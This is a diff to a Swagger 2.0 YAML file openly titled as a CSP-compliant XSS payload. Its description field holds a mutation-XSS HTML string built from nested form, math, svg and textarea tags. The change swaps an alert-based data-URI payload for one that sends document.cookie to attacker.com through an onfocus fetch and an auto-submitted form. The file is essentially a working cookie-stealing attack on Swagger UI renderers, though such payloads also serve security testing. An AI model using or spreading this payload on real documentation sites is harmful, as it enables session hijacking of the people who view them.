@@ -1,10 +1,11 @@
 swagger: '2.0'
 info:
-  title: CSP-Aware Swagger XSS Payload
+  title: CSP-Compliant Swagger XSS Payload
   description: |
     <form><math><mtext></form><form><mglyph><svg><mtext><textarea>
-    </svg></mtext></mglyph><path id="</textarea><img src="data:text/html;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoJ2J5cGFzcycpPg==">
-    </form>
+    </svg></mtext></mglyph></textarea><form action="https://attacker.com/log" id="xss">
+      <input autofocus onfocus="fetch('https://attacker.com?c='+document.cookie)">
+    </form><script>document.getElementById('xss').submit()</script>
   version: 1.0.0
 paths:
   /test:
